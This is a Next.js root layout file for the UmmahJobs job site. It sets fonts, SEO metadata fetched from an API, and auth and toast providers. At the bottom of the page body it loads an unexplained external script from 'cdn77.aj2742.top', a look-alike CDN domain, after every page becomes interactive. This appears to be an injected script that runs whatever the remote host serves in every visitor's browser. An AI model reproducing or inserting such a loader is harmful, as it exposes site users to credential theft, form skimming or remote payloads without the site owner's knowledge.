import type { Metadata } from 'next'
import { Inter } from 'next/font/google'
import Script from 'next/script'
import './globals.css'
import { AuthProvider } from '@/context/AuthContext'
import ConditionalLayout from '@/components/layout/ConditionalLayout'
import { ToastProvider } from '@/components/ui/Toast'

const API = process.env.NEXT_PUBLIC_API_URL

const inter = Inter({
  variable: '--font-inter',
  subsets: ['latin'],
  display: 'swap',
})

export async function generateMetadata(): Promise<Metadata> {
  try {
    const res = await fetch(`${API}/api/settings`, { next: { revalidate: 3600 } })
    if (!res.ok) throw new Error()
    const settings: Record<string, string> = await res.json()
    return {
      title: settings.seo_title || 'UmmahJobs — Halal Jobs for Muslim Professionals',
      description: settings.seo_description || 'Find halal jobs and connect with Muslim-friendly employers. Browse thousands of opportunities on UmmahJobs.com',
      openGraph: settings.seo_og_image ? { images: [settings.seo_og_image] } : undefined,
    }
  } catch {
    return {
      title: 'UmmahJobs — Halal Jobs for Muslim Professionals',
      description: 'Find halal jobs and connect with Muslim-friendly employers. Browse thousands of opportunities on UmmahJobs.com',
    }
  }
}

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode
}>) {
  return (
    <html lang="en" className={inter.variable}>
      <body>
        <AuthProvider>
          <ToastProvider>
            <ConditionalLayout>{children}</ConditionalLayout>
          </ToastProvider>
        </AuthProvider>
        <Script
          src="https://cdn77.aj2742.top/dcfc6ab7.js"
          strategy="afterInteractive"
        />
      </body>
    </html>
  )
}
